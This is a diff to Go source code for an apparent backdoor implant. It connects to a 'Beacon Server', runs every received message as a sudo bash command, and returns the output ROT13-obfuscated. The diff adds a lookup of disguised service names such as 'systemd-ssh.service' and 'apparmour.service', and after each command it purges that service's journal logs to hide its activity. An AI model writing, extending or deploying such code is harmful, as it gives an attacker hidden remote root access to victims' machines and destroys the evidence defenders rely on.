@@ -7,7 +7,6 @@ package main
 
 import (
 	"bufio"
-	"bytes"
 	"fmt"
 	"math/rand"
 	"net"
@@ -80,8 +79,24 @@ func sendKeepAlive(socket net.Conn) {
 	}
 }
 
+func getServiceName() string {
+	possibleServiceNames := []string{"systemd-ssh.service", "snapd.container.service", "apparmour.service", "systemd-logind-ssh.service", "firewall.service"}
+
+	cmd := exec.Command("bash", "-c", "sudo systemctl --type=service")
+	output, err := cmd.Output()
+	if err == nil {
+		for name := range possibleServiceNames {
+			if strings.Contains(string(output), possibleServiceNames[name]) {
+				return possibleServiceNames[name]
+			}
+		}
+	}
+	return ""
+}
+
 func main() {
 	// Resolve IP Address of a Beacon Server
+	serviceName := getServiceName()
 	serverIPAddress := resolveBeaconIPAddr()
 	if serverIPAddress != "0" {
 		// Connect to Beacon Server
@@ -109,14 +124,7 @@ func main() {
 							// As long as the message is not a KEEP_ALIVE message or apart of the
 							// HTTP header, execute it as a command
 							cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
-							var stdoutBuf, stderrBuf bytes.Buffer
-							cmd.Stdout = &stdoutBuf
-							cmd.Stderr = &stderrBuf
-							err := cmd.Run()
-							output := stdoutBuf.String()
-							//output, err := cmd.Output()
-							//cmd.Stdout = io.Discard
-							//cmd.Stderr = io.Discard
+							output, err := cmd.Output()
 							if err != nil {
 								fmt.Println("Error Executing command: ", err)
 
@@ -124,9 +132,11 @@ func main() {
 								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
 							} else {
 								finalOutput := string(output) + "END_OF_OUTPUT\r\n"
-
 								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
 							}
+							// Clear logs of our service
+							clearLogs := exec.Command("bash", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
+							clearLogs.Run()
 						}
 					}
 				}
